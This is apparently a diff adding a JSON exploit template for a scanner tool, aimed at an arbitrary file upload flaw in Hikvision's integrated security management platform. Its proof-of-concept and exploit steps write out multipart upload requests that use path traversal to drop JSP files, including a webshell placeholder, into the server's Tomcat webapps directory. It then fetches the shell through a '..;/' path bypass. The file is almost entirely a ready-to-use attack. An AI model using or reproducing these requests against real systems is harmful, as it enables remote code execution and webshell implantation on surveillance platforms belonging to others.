@@ -1,0 +1,34 @@
+{
+	"name":"综合安防管理平台 report 任意文件上传",
+	"tag":"hikvision",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/svm/api/external/report",
+		"pocPost":"------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\"\r\nContent-Type: application/zip\r\n\r\n<%jsp%>\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--",
+		"header":{
+			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/svm/api/external/report",
+			"expPost":"------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/24k.jsp\"\r\nContent-Type: application/zip\r\n\r\n{{webshell}}\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--",
+			"header":{
+				"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		},
+		"step2":{
+			"expGet":"/portal/ui/login/..;/..;/24k.jsp",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
